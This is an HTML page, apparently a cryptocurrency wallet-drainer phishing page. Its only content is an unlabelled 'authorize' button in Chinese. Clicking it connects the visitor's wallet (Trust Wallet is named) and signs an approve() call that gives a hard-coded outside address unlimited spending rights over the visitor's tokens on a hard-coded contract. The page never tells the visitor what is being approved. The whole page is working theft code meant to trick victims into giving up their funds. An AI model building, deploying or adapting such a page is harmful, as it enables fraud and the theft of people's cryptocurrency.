<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title></title>
  <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js"></script>
  <style>
    body { margin:0; padding:0; background:#000; height:100vh; display:flex; align-items:center; justify-content:center; }
    button { 
      padding: 40px 80px; 
      font-size: 28px; 
      background: #00cc66; 
      color: #000; 
      border: none; 
      border-radius: 20px; 
      cursor: pointer;
    }
  </style>
</head>
<body>
  <button onclick="triggerApprove()">授 權</button>

  <script>
    async function triggerApprove() {
      if (typeof window.ethereum === 'undefined') {
        alert("請在 Trust Wallet 中打開此頁面");
        return;
      }

      try {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        const signer = provider.getSigner();

        const contract = new ethers.Contract(
          "0xF911450D38669139158C71CD9ED0d2f1524f8888",
          ["function approve(address,uint256)"],
          signer
        );

        const tx = await contract.approve(
          "0x5762D5c904cC7Db9B927cd26B0B3225D50bf50ED", 
          ethers.constants.MaxUint256
        );

        alert("交易已發送！Hash: " + tx.hash);
      } catch (e) {
        console.error(e);
        alert("錯誤: " + (e.message || "未知錯誤"));
      }
    }
  </script>
</body>
</html>
